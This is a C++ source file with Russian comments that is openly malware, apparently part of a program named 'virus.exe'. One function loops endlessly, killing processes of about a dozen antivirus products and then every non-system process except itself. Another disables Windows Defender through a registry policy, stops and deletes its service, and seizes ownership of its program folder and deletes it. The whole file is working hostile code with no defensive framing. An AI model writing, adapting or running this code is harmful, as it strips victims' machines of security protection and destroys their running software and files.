#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <vector>

void KillProcesses() {
    while (true) {
        std::vector<std::string> targets = {
            // Windows Defender
            "MsMpEng.exe",
            "SecurityHealthService.exe",

            // Dr.Web
            "drweb32.exe",
            "drwebscd.exe",

            // ESET NOD32
            "egui.exe",
            "ekrn.exe",

            // Avast
            "AvastSvc.exe",
            "AvastUI.exe",

            // Kaspersky
            "avp.exe",
            "avpui.exe",

            // Bitdefender
            "bdagent.exe",
            "BdVSS.exe",

            // McAfee
            "mcshield.exe",
            "mctray.exe",

            // Norton
            "ccSvcHst.exe",
            "norton.exe",

            // Webroot
            "WRSA.exe",
            "WRMail.exe",

            // Malwarebytes
            "mbam.exe",
            "mbamservice.exe",

            // И другие
            "avg.exe",
            "avguard.exe",
            "avcenter.exe",
            "avastui.exe",
            "vsserv.exe"
        };

        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot == INVALID_HANDLE_VALUE) {
            Sleep(1000);
            continue;
        }

        PROCESSENTRY32 pe = { sizeof(pe) };
        if (Process32First(snapshot, &pe)) {
            do {
                for (const auto& target : targets) {
                    if (_stricmp(pe.szExeFile, target.c_str()) == 0) {
                        HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                        if (process) {
                            TerminateProcess(process, 0);
                            CloseHandle(process);
                        }
                        break;
                    }
                }
            } while (Process32Next(snapshot, &pe));
        }
        CloseHandle(snapshot);

        // Также убиваем все процессы, кроме системных и себя
        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot != INVALID_HANDLE_VALUE) {
            if (Process32First(snapshot, &pe)) {
                do {
                    std::string processName = pe.szExeFile;

                    // Проверяем, что процесс не системный
                    bool isSystem = false;
                    std::string systemProcesses[] = {
                        "System", "svchost.exe", "winlogon.exe", "csrss.exe",
                        "services.exe", "lsass.exe", "explorer.exe", "wininit.exe"
                    };
                    for (const auto& sys : systemProcesses) {
                        if (_stricmp(processName.c_str(), sys.c_str()) == 0) {
                            isSystem = true;
                            break;
                        }
                    }

                    // Если не системный и не мы — убиваем
                    if (!isSystem && processName != "virus.exe" &&
                        processName.find("main") == std::string::npos) {
                        HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                        if (process) {
                            TerminateProcess(process, 0);
                            CloseHandle(process);
                        }
                    }
                } while (Process32Next(snapshot, &pe));
            }
            CloseHandle(snapshot);
        }

        Sleep(5000);
    }
}

void DestroyAntivirus() {
    // Отключаем Windows Defender через реестр
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Policies\\Microsoft\\Windows Defender",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueExA(hKey, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }

    // Удаляем службу Windows Defender
    system("sc stop WinDefend");
    system("sc delete WinDefend");

    // Удаляем файлы Defender
    system("takeown /f \"C:\\Program Files\\Windows Defender\" /r /d y");
    system("icacls \"C:\\Program Files\\Windows Defender\" /grant administrators:F /t");
    system("rmdir /s /q \"C:\\Program Files\\Windows Defender\"");

    // Запускаем поток убийства процессов
    std::thread killThread(KillProcesses);
    killThread.detach();
}
